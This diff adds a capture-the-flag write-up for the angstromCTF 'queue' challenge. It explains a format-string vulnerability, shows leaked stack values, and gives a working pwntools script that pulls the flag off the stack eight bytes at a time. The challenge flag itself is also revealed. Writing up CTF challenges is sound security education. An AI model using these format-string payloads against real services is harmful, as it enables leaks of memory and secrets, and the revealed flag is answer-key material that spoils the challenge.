@@ -375,7 +375,45 @@ Yes! That was it, using this input the server returns the flag
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: queue_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+Connecting to the challenge we are asked: `What did you learn in class today?` so we can send a string. We can submit a format string like `%p` to see that it returns `Oh nice, 0x7ffe79e8d120`. We can also access directly some parameters in this way:
+
+`%<number_of_parameter>$<format>` for exemple: `%14$llx,%15$llx,%16$llx`; it returns: 
+
+`Oh nice, 3474737b66746361,75715f74695f6b63,615f74695f657565`.
+We can see with some tries that the flag is here in the stack. So we can script the solution.
+
+```python
+from Crypto.Util.number import *
+from pwn import *
+
+flag = ""
+host =  "challs.actf.co"
+port = 31322
+for i in range (14, 19, 1):
+    r = remote(host, port)
+    r.recvuntil(b'? ')
+    payload = f'%{i}$llx,%{i+1}$llx'
+    r.sendline(bytes(payload, 'utf-8'))
+    r.recvuntil(b'Oh nice, ')
+    stringa = r.recvline()
+    stringa = stringa.decode('utf-8')
+    stringhe = stringa.split(',')
+    temp = ''
+    for s in stringhe:
+        if len(s)%2 != 0:
+            s = '0' + s
+        temp += s
+    temp = temp.strip()
+    temp = temp[:-1]
+    flag = flag + str((bytes.fromhex(temp)[::-1])[-8:])
+    r.close()
+flag = flag.replace('\'b\'', '')
+print(flag)
+```
+If the input string is too long it overwrite the flag in the stack, so we have to take it piece by piece. The code above take 8 chars of the flag at every iteration and put them in the variable flag. At the end we only clean the output.
+
+
+🏁 _<actf{st4ck_it_queue_it_a619ad974c864b22}>_{: .spoiler}
 
 ## gaga
 
